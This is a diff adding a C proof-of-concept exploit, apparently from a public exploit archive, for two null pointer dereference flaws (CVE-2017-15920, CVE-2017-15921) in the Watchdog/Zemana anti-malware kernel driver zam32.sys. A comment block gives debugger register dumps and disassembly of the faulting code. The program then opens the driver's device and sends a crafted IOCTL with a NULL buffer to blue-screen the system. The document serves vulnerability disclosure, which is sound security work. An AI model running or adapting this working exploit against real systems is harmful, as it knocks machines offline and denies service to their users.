@@ -1,0 +1,141 @@
+/*
+
+Exploit Title    - Watchdog Development Anti-Malware/Online Security Pro Null Pointer Dereference
+Date             - 26th October 2017
+Discovered by    - Parvez Anwar (@parvezghh)
+Vendor Homepage  - https://www.watchdogdevelopment.com/
+Tested Version   - 2.74.186.150
+Driver Version   - 2.21.63 - zam32.sys
+Tested on OS     - 32bit Windows 7 SP1 
+CVE IDs          - CVE-2017-15920 and CVE-2017-15921
+Vendor fix url   - Will be fixed in a future release
+Fixed Version    - n/a
+Fixed driver ver - n/a
+
+
+
+A null pointer dereference vulnerability is triggered when sending an operation
+to ioctls 0x80002010 or 0x80002054. This is due to input buffer being NULL or
+the input buffer size being 0 as they are not validated.
+
+kd> dt nt!_irp @esi -r
+   +0x000 Type             : 0n6
+   +0x002 Size             : 0x94
+   +0x004 MdlAddress       : (null) 
+   +0x008 Flags            : 0x60000
+   +0x00c AssociatedIrp    : <unnamed-tag>
+      +0x000 MasterIrp        : (null) 
+      +0x000 IrpCount         : 0n0
+      +0x000 SystemBuffer     : (null)  <----------- null pointer
+
+
+0x80002010
+----------
+CVE-2017-15921
+
+kd> r
+eax=00000000 ebx=80002010 ecx=cff82bd9 edx=90889f2e esi=00000000 edi=c0000001
+eip=9087cd9f esp=a7a80ab8 ebp=a7a80ab8 iopl=0         nv up ei pl nz na po nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000202
+zam32+0xdd9f:
+9087cd9f ff30            push    dword ptr [eax]      ds:0023:00000000=????????
+
+
+.text:90AD9104                 push    offset aIoctl_register                        ; "IOCTL_REGISTER_PROCESS"
+.text:90AD9109                 push    0                                             
+.text:90AD910B                 push    edx                                           ; Pointer to "DeviceIoControlHandler" string
+.text:90AD910C                 push    208h
+.text:90AD9111                 push    offset aMain_c                                
+.text:90AD9116                 push    1
+.text:90AD9118                 call    sub_90AD3ADA
+.text:90AD911D                 add     esp, 18h
+.text:90AD9120                 push    esi                                           ; esi is null becomes arg_0 otherwise would point to our input "SystemBuffer"
+.text:90AD9121                 call    sub_90AD8D90
+
+.text:90AD8D90 sub_90AD8D90    proc near                                             
+.text:90AD8D90
+.text:90AD8D90 arg_0           = dword ptr  8
+.text:90AD8D90
+.text:90AD8D90                 push    ebp                                           
+.text:90AD8D91                 mov     ebp, esp
+.text:90AD8D93                 call    sub_90AD414A
+.text:90AD8D98                 test    eax, eax
+.text:90AD8D9A                 jz      short loc_90AD8DA6
+.text:90AD8D9C                 mov     eax, [ebp+arg_0]                              ; Null pointer dereference 
+.text:90AD8D9F                 push    dword ptr [eax]                               ; BSOD !!!!
+.text:90AD8DA1                 call    sub_90AD428C
+.text:90AD8DA6
+.text:90AD8DA6 loc_90AD8DA6:                                                         
+.text:90AD8DA6                 pop     ebp
+.text:90AD8DA7                 retn    4
+.text:90AD8DA7 sub_90AD8D90    endp
+.text:90AD8DA7
+.text:90AD8DAA
+
+
+0x80002054
+----------
+CVE-2017-15920
+
+kd> r
+eax=861e8320 ebx=80002054 ecx=cff82bd9 edx=90889f2e esi=00000000 edi=c0000001
+eip=9087d41a esp=99f4eaac ebp=99f4eadc iopl=0         nv up ei pl zr na pe nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246
+zam32+0xe41a:
+9087d41a c7061e010000    mov     dword ptr [esi],11Eh ds:0023:00000000=????????
+
+
+.text:90AD9401                 push    offset aIoctl_get_driv                        ; IOCTL_GET_DRIVER_PROTOCOL
+.text:90AD9406                 push    0
+.text:90AD9408                 push    edx
+.text:90AD9409                 push    2A3h
+.text:90AD940E                 push    offset aMain_c                                
+.text:90AD9413                 push    1
+.text:90AD9415                 call    sub_90AD3ADA
+.text:90AD941A                 mov     dword ptr [esi], 11Eh                         ; BSOD !!!! Null pointer dereference otherwise would point to our input "SystemBuffer"
+.text:90AD9420                 jmp     loc_90AD9622
+
+
+*/
+
+
+#include <stdio.h>
+#include <windows.h>
+
+int main(int argc, char *argv[]) 
+{
+    HANDLE         hDevice;
+    char           devhandle[MAX_PATH];
+    DWORD          dwRetBytes = 0;
+
+
+    sprintf(devhandle, "\\\\.\\%s", "zemanaantimalware");
+
+    hDevice = CreateFile(devhandle, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING , 0, NULL);
+    
+    if(hDevice == INVALID_HANDLE_VALUE)
+    {
+        printf("\n[-] Open %s device failed\n\n", devhandle);
+        return -1;
+    }
+    else 
+    {
+        printf("\n[+] Open %s device successful", devhandle);
+    }	
+
+    printf("\n[~] Press any key to continue . . .");
+    getch();
+
+    DeviceIoControl(hDevice, 0x80002010, NULL, 0, NULL, 0, &dwRetBytes, NULL);
+//  DeviceIoControl(hDevice, 0x80002054, NULL, 0, NULL, 0, &dwRetBytes, NULL);
+
+    printf("\n[+] DoSed\n\n");
+ 
+    CloseHandle(hDevice);
+    return 0;
+}
+
+
+
+
+
